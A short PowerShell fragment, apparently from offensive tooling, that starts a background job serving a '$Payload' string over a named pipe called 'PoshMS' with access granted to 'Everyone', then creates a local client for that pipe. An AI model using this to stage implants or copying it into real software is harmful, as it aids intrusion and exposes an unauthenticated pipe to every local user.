$scriptblock = 
{
    param ($PipeName,$Payload)
    while ($True) {

        $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)
        $pipe.WaitForConnection(); 

        $pipeReader = new-object System.IO.StreamReader($pipe)
        $pipeWriter = new-object System.IO.StreamWriter($pipe)
        $pipeWriter.AutoFlush = $true
        $pipeWriter.WriteLine($Payload);
 
        $pipeReader.Dispose();
        $pipe.Dispose();
    }

}

start-job -ScriptBlock $scriptblock -ArgumentList @("PoshMS",$payload)
$pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMS");


